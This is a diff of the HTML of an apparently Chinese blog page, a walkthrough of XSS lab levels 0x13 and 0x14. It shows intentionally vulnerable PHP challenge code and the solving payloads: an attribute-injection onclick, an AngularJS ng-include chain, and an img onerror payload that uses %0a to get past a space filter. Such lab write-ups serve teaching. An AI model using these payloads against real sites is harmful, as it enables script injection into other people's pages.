+<span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span>
+<span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span>
+<span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.htmlspecialchars(<span class="hljs-variable">$str00</span>).<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span>
+<span class="hljs-string">&lt;input name=&quot;t_cook&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span>
+<span class="hljs-string">&lt;/form&gt;</span>
+<span class="hljs-string">&lt;/center&gt;&#x27;</span>;
+<span class="hljs-meta">?&gt;</span></code></pre></div>
 
 <p>不多说,一条payload打三题😅😅,本题伪造cookie即可,传值变量名记得改一下</p>
 <p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-cookie.png" srcset="/Study/img/loading.gif" lazyload></p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">user=<span class="hljs-string">&quot; type=&quot;</span>text<span class="hljs-string">&quot; onclick=javascript:alert(1) //</span><br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs js">user=<span class="hljs-string">&quot; type=&quot;</span>text<span class="hljs-string">&quot; onclick=javascript:alert(1) //</span></code></pre></div>
 
 <br>
 <br>
 
-<h2 id="0x13-恭喜你快要通关了"><a href="#0x13-恭喜你快要通关了" class="headerlink" title="0x13 恭喜你快要通关了"></a>0x13 恭喜你快要通关了</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;src&quot;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;</span>.htmlspecialchars(<span class="hljs-variable">$str</span>).<span class="hljs-string">&#x27;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<h2 id="0x13-恭喜你快要通关了"><a href="#0x13-恭喜你快要通关了" class="headerlink" title="0x13 恭喜你快要通关了"></a>0x13 恭喜你快要通关了</h2><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);
+<span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;src&quot;</span>];
+<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;</span>.htmlspecialchars(<span class="hljs-variable">$str</span>).<span class="hljs-string">&#x27;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;</span>;
+<span class="hljs-meta">?&gt;</span></code></pre></div>
 
 <p><strong>题目提供的Angular JS的链接已经失效,需要替换连接</strong></p>
 <p>这题考察<code>Angular JS</code> 的<code>ng-include</code>用法，具体可以参考这篇资料：<a target="_blank" rel="noopener" href="http://www.runoob.com/angularjs/ng-ng-include.html">AngularJS ng-include 指令</a></p>
 <p><strong>ng-include</strong> 指令用于包含外部的 HTML 文件，包含的内容将作为指定元素的子节点。<code>ng-include</code> 属性的值可以是一个表达式，返回一个文件名。默认情况下，包含的文件需要包含在同一个域名下。所以这里就用来包含其他关的页面来触发弹窗。</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">level14.php?src=<span class="hljs-string">&quot;level1.php?name=&lt;img src=x onerror=alert(&#x27;XSS&#x27;)&gt;&quot;</span><br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs js">level14.php?src=<span class="hljs-string">&quot;level1.php?name=&lt;img src=x onerror=alert(&#x27;XSS&#x27;)&gt;&quot;</span></code></pre></div>
 
 <br>
 <br>
 
-<h2 id="0x14-厉害了-Word哥"><a href="#0x14-厉害了-Word哥" class="headerlink" title="0x14 厉害了 Word哥"></a>0x14 厉害了 Word哥</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = strtolower(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);<br><span class="hljs-variable">$str2</span>=str_replace(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=str_replace(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-variable">$str4</span>=str_replace(<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,<span class="hljs-variable">$str3</span>);<br><span class="hljs-variable">$str5</span>=str_replace(<span class="hljs-string">&quot;    &quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,<span class="hljs-variable">$str4</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;center&gt;&quot;</span>.<span class="hljs-variable">$str5</span>.<span class="hljs-string">&quot;&lt;/center&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<h2 id="0x14-厉害了-Word哥"><a href="#0x14-厉害了-Word哥" class="headerlink" title="0x14 厉害了 Word哥"></a>0x14 厉害了 Word哥</h2><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);
+<span class="hljs-variable">$str</span> = strtolower(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);
+<span class="hljs-variable">$str2</span>=str_replace(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,<span class="hljs-variable">$str</span>);
+<span class="hljs-variable">$str3</span>=str_replace(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,<span class="hljs-variable">$str2</span>);
+<span class="hljs-variable">$str4</span>=str_replace(<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,<span class="hljs-variable">$str3</span>);
+<span class="hljs-variable">$str5</span>=str_replace(<span class="hljs-string">&quot;    &quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,<span class="hljs-variable">$str4</span>);
+<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;center&gt;&quot;</span>.<span class="hljs-variable">$str5</span>.<span class="hljs-string">&quot;&lt;/center&gt;&quot;</span>;
+<span class="hljs-meta">?&gt;</span></code></pre></div>
 
 <p>本题不仅过滤了script,还过滤了空格,因此使用其他其他DOM事件且使用一下制符替换空格即可</p>
 <table>
@@ -374,7 +573,8 @@
 <td>%0D</td>
 </tr>
 </tbody></table>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js">payload:<br><span class="xml">&lt;img%0asrc=x%0aonerror=alert(1)&gt;</span><br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs js">payload:
+<span class="xml">&lt;img%0asrc=x%0aonerror=alert(1)&gt;</span></code></pre></div>
 
             </div>
             <hr>
